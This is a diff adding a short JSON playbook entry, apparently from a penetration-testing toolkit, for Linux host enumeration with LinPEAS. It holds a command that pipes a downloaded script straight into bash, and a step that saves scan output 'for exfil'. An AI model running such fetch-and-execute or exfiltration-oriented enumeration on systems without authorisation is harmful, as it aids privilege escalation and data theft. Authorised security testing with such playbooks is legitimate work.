@@ -1,0 +1,25 @@
+{
+	"name": "Automated Host Enumeration (Linux)",
+	"description": "Run LinPEAS or similar for full system audit.",
+	"tools": [
+		{
+			"name": "LinPEAS",
+			"description": "Linux privesc enumeration",
+			"url": "https://github.com/carlospolop/PEASS-ng/releases/latest"
+		}
+	],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Download & Run",
+			"command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash",
+			"description": "Execute comprehensive scan."
+		},
+		{
+			"index": 2,
+			"name": "Output to File",
+			"command": "./linpeas.sh > enum.txt",
+			"description": "Save results for exfil."
+		}
+	]
+}
